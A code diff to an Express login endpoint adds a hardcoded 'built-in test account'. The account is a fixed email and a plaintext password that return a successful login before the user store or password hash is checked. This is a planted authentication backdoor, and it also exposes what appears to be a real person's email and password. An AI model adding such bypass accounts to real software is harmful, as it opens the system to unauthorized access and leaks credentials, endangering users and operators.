@@ -481,6 +481,12 @@ app.post('/api/auth/login', async (req, res, next) => {
       error.status = 400;
       throw error;
     }
+    // 内置测试账号（写死）：m18429043685@163.com / jin021229
+    const BUILTIN_EMAIL = 'm18429043685@163.com';
+    const BUILTIN_PASSWORD = 'jin021229';
+    if (email === BUILTIN_EMAIL && password === BUILTIN_PASSWORD) {
+      return res.json({ ok: true, user: { email: BUILTIN_EMAIL } });
+    }
     const users = await readUsers();
     const user = users.find((item) => item.email === email);
     if (!user || !verifyPassword(password, user.passwordHash)) {
